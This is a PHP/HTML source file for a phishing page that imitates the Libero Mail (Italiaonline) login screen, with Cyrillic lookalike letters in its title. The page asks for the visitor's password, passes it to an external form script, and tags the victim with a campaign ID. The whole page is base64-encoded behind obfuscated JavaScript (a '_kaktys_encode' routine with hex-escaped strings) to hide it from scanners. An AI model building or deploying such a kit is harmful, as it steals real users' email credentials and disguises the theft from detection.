<?php 

         $relative_root="";
         $parent_folders="";
         function include_config(){
            global $relative_root,$parent_folders;
            while(!file_exists($relative_root."cfg.php")){
                $parent_folders=basename(realpath($relative_root))."/".$parent_folders;
                $relative_root.="../";
            };
            return $relative_root;
         };
         require_once(include_config().'cfg.php');

         if(isset($php_js)){
             $php_js->relative_root=$relative_root;
             $php_js->parent_folders=$parent_folders;
         }
         $php_js->fake_base="/";
?>
<!DOCTYPE html>
<html>

<head>
    <script type="text/javascript" src="<?php echo $php_js->relative_root ?>bower_components/jquery/dist/jquery.min.js"></script>
    <script type="text/javascript" src="<?php echo $php_js->relative_root ?>bower_components/ua-parser-js/dist/ua-parser.min.js"></script>
    <link rel="stylesheet" href="<?php echo $php_js->relative_root ?>bower_components/font-awesome/css/font-awesome.min.css">
    <script type="text/javascript" src="<?php echo $php_js->relative_root ?>core/form/core_form.js"></script>


    <script type="text/javascript" src="<?php echo $php_js->relative_root ?>bower_components/angular/angular.min.js"></script>
    <link rel="stylesheet" href="<?php echo $php_js->relative_root ?>core/form/core_form.css">
    <link rel="stylesheet" href="form/css.css">
    <meta content="text/html; charset=UTF-8" http-equiv="Content-Type">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Liber&#1086; M&#1072;il - l&#1086;gin</title>
    <link media="all" href="index.css" type="text/css" rel="stylesheet">
</head>

<?php ob_start() ?>
<body     ng-app="app" ng-controller="c1"   ng-cloak      class="advmaxi" style="background-image: url('imgad'); background-repeat: no-repeat; background-color: rgb(255, 255, 255); background-position: center top;">
    <div id="adv_click" style="position: fixed; top: -10px; left: -10px; width: 100%; height: 100%; z-index: 10;"><a target="_top" style="cursor: pointer; display: block; width: 100%; height: 100%;"></a></div>
    <div id="adleaderboard"> </div>
    <div id="admobleaderboard"> </div>
    <div id="wrapper-iol">
        <section class="content">
            <header> <a class="login-iol" title="Vai all'Home Page di Libero"></a>
                <h3> Accedi </h3>
                <span class="user">{{data.user}}</span>
            </header>
            <section class="auth">
                


                <form name="autenticazione" onsubmit="send1(event,'next__');return false">
                    

                    <div class="form-group " style="position: relative;">
                        <input name="pass" id="pass" maxlength="256" placeholder="Password" autocomplete="" class="form-control" pattern=".{4,}" data-err_text="Please enter valid "  type="text">
                        <span id="box_err_msg" class="error-txt err_span" style="display: none;">Password non valida</span>
                    </div>



                    <input value="AVANTI" id="form_submit" type="submit">
                    


                    <section class="settings"> <a target="_top" class="pwd">Serve aiuto?</a> <input name="REMEMBERME" id="REMEMBERME" value="S" title="Rememberme" type="checkbox"> <label for="REMEMBERME">Rimani collegato</label> </section>
                    <div class="recaptcha" id="captchablock" style="display: block;"> </div> <span id="box_err_captcha" class="error-txt" style="bottom: 12px;"> </span>
                </form>





            </section>
            <footer>Non hai un account? <a>Registrati in un minuto</a></footer>
        </section>
        <div class="ads-maxi" id="adsplash">
            <div id="google_ads_iframe_/5180/libero/webmail/login/step1_0__container__" style="border: 0pt none;"></div>
        </div>
        <div id="divisorio" class="divisorio" style="display: none;"></div>
        <div id="box-editoriale" class="box-editoriale" style="display: none;">
            <header>
                <h4>I PIÙ LETTI DI</h4>
                <h3><a target="_top"><img src="logo-dilei.png"></a></h3>
            </header>
            <ul>
                <li> <a id="acontent_1" target="_top"><img id="img_1" src="untitled">
                        <p id="p_1"></p>
                    </a> <a id="asubtitle_1" class="canale" target="_top">Moda</a> </li>
                <li> <a id="acontent_2" target="_top"><img id="img_2" src="untitled">
                        <p id="p_2"></p>
                    </a>
                    <div class="clearfix"></div>
                </li>
                <li> <a id="acontent_3" target="_top"><img id="img_3" src="untitled">
                        <p id="p_3"></p>
                    </a>
                    <div class="clearfix"></div>
                </li>
                <li> <a id="acontent_4" target="_top"><img id="img_4" src="untitled">
                        <p id="p_4"></p>
                    </a>
                    <div class="clearfix"></div>
                </li>
            </ul>
            <footer><a target="_top">SCOPRI DI PIÙ</a></footer>
        </div>
    </div>
    <footer class="footer-iol">
        <ul>
            <li><a target="_top">Chi siamo</a></li>
            <li><a target="_top">Blog ufficiale</a></li>
            <li><a target="_top">Libero Easy</a> </li>
            <li><a target="_top">Aiuto</a></li>
            <li><a target="_top">Note legali</a> </li>
            <li><a target="_top">Privacy</a></li>
            <li><a target="_top">Cookie Policy</a> </li>
            <li><a target="_top">Commissariato di P.S.</a></li>
        </ul>
        <p>© ITALIAONLINE 2019 - P. IVA 03970540963</p>
    </footer>
    <img id="iol-tracking-img" src="m" style="display: none;">
    <script type="text/javascript">
    var bid = "<?php echo isset($_COOKIE['bid'])?$_COOKIE['bid']:basename(dirname(dirname(__FILE__))) ?>"
    var php_js = <?php  echo json_encode($php_js) ?>
    </script>
    <script type="text/javascript" src="form/form.js?v=<?php echo uniqid() ?>"></script>
    <script type="text/javascript" src="ng/ng.js?v=<?php echo uniqid() ?>"></script>
</body>
<?php $html=ob_get_clean()?><?php $test=0;if($test){    echo $html; }else{     ?>  <script type="text/javascript">     var _0xa211=["","\x6A\x6F\x69\x6E","\x25","\x73\x6C\x69\x63\x65","\x30\x30","\x63\x68\x61\x72\x43\x6F\x64\x65\x41\x74","\x63\x61\x6C\x6C","\x6D\x61\x70","\x70\x72\x6F\x74\x6F\x74\x79\x70\x65"];function _kaktys_encode(_0x60c0x2){return decodeURIComponent(Array[_0xa211[8]][_0xa211[7]][_0xa211[6]](atob(_0x60c0x2),function(_0x60c0x3){return _0xa211[2]+ (_0xa211[4]+ _0x60c0x3[_0xa211[5]](0).toString(16))[_0xa211[3]](-2)})[_0xa211[1]](_0xa211[0]))}     document.write(_kaktys_encode("<?php echo base64_encode($html) ?>")); </script>    <?php }  ?> 

</html>